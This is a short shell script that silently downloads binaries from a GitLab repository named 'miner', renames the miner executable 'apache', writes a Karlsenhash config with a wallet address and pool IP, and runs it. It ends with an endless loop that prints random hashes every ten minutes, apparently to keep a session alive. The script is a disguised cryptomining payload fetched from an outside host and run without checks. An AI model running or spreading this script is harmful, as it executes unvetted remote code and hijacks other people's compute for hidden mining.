mkdir 1
cd 1
wget -qO libnvrtc-builtins.so.12.0.76 https://gitlab.com/ghcees/miner/-/raw/main/libnvrtc-builtins.so.12.0.76 >/dev/null 2>&1
wget -qO amdmemtweak https://gitlab.com/ghcees/miner/-/raw/main/amdmemtweak >/dev/null 2>&1
wget -qO libnvrtc.so.12.0.76 https://gitlab.com/ghcees/miner/-/raw/main/libnvrtc.so.12.0.76 >/dev/null 2>&1
chmod +x *
curl -0 https://gitlab.com/ghcees/miner/-/raw/main/n388 -o apache && chmod +x apache >/dev/null 2>&1
cat > config.ini <<END
[Karlsenhash]
wallet = karlsen:qz50t7zq32gt0f5wgnu2p04lw2ye9xyutxssglgqgcv92k5m24kn6j8vrqdjq
rigName = nankarl
pool1 = 47.254.125.141:443
watchdog = true
restarts = 0
END

./apache

while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
